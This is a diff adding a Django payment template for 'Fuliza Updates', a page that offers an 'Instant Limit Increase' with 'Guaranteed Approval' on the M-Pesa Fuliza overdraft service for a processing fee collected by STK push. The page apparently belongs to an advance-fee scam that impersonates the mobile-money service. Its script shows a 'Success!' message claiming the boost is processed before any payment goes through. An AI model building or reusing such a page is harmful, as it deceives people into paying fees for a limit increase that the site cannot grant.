@@ -1,0 +1,199 @@
+<!-- Fuliza/templates/payment.html -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Make Payment</title>
+<style>
+body {
+    font-family: Arial;
+    background: #f4f6f5;
+}
+
+.container {
+    max-width: 2000px;
+    margin: auto;
+    background: white;
+    padding: 200px;
+    border-radius: 10px;
+}
+h1{
+    text-align: center;
+    color: green;
+
+}
+
+h2 {
+    text-align: center;
+    color: green;
+}
+h6{
+    text-align: center;
+    font-size: bold;
+    color: green;
+}
+p{
+    text-align: center;
+    font-size: bold;
+    color: grey;
+}
+/* Align left & right */
+.row {
+    display: flex;
+    justify-content: space-between;
+    margin: 50px 0;
+}
+.row span:first-child {
+        font-weight: bold;
+        color: grey;
+}
+
+/* Button full width */
+button {
+    width: 100%;
+    padding: 12px;
+    background-color: green;
+    color: white;
+    border: none;
+    border-radius: 20px;
+    margin-top: 15px;
+    font-size: 16px;
+}
+.popup {
+    display: none; /* hidden by default */
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    justify-content: center;
+    align-items: center;
+    background: rgba(0,0,0,0.5);
+    text-align: center;
+    padding-top: 100px;
+    z-index: 1000;
+}
+.popup-content {
+    background: white;
+    display: inline-block;
+    padding: 30px;
+    border-radius: 10px;
+    text-align: center;
+    max-width: 400px;
+}
+
+/* Popup headings and paragraphs */
+.popup-content h1 {
+    color: green;
+    margin-bottom: 15px;
+}
+.popup-content p {
+    margin: 10px 0;
+}
+
+/* Popup button */
+.popup-content button {
+    padding: 10px 20px;
+    background: green;
+    color: white;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    margin-top: 15px;
+}
+footer {
+    text-align: center;
+    color: green;
+}
+
+@media (max-width: 768px) {
+    .container {
+        width: 90%;
+        padding: 15px;
+    }
+
+    a{
+        width: 100%;
+        text-align: center;
+    }
+}
+
+@media (max-width: 480px) {
+    body{
+        padding: 10px;
+    }
+
+    h1{
+        font-size: 1.5rem;
+    }
+    .badge{
+        padding: 4px 8px;
+        font-size: 0.9rem;
+    }
+}
+</style>
+</head>
+<body>
+   <div class="container">
+    <h1>Fuliza Updates</h1>
+    <h6>Instant Limit Increase • Guaranteed Approva</h6>
+
+    <h2>Confirm Payment</h2>
+
+    <p>Please confirm your selection before we initiate the STK push.</p>
+
+    <div class="row">
+        <span>New Limit</span>
+        <span><b>{{ amount }}</b></span>
+    </div>
+
+    <div class="row">
+        <span>Processing Fee</span>
+        <span><b>Ksh {{ fee }}</b></span>
+    </div>
+<hr>
+
+    <div class="row">
+        <span>Payment Phone</span>
+        <span><b>+254 {{ phone|slice:"1:" }}</b></span>
+    </div>
+
+    <form id="payForm" method="POST">
+        {% csrf_token %}
+        <button type="submit">Pay Now</button>
+    </form>
+
+</div>
+
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <h1>✅ Success!</h1>
+            <p>Your boost of Ksh {{ amount }} has been successfully processed.</p>
+            <p>Please complete the payment on your phone.</p>
+            <button id="closePopup">OK</button>
+        </div>
+    </div>
+
+<script>
+    const form = document.getElementById('payForm');
+    const popup = document.getElementById('popup');
+    const closeBtn = document.getElementById('closePopup');
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault(); // prevent immediate form submission
+        popup.style.display = 'flex'; // show success message immediately
+
+    });
+
+    closeBtn.addEventListener('click', function(){
+    popup.style.display = 'none';
+    form.submit();
+    });
+</script>
+
+<footer>
+    <p><i>&copy;2026 Fuliza Updates. All Rights Reserved.</i></p>
+</footer>
+</body>
+</html>
